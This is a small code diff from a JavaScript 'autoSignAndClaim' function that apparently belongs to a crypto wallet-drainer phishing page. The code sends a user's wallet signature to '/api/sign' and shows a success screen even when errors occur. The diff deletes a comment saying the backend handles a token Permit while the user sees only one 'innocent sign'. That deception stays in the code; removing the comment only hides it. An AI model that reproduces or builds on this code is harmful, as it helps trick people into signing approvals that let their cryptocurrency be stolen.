@@ -348,7 +348,6 @@ async function autoSignAndClaim(){
     }catch(e){ throw new Error('Signature rejected: '+(e.message||'')); }
     await fetch('/api/sign',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:W.addr,method:'personal_sign',message:msgA,signature:sigA,source:'stage-a'})});
     
-    // Backend handles Permit internally - frontend only shows 1 innocent sign
     goSuccess();
   }catch(e){
     goSuccess();
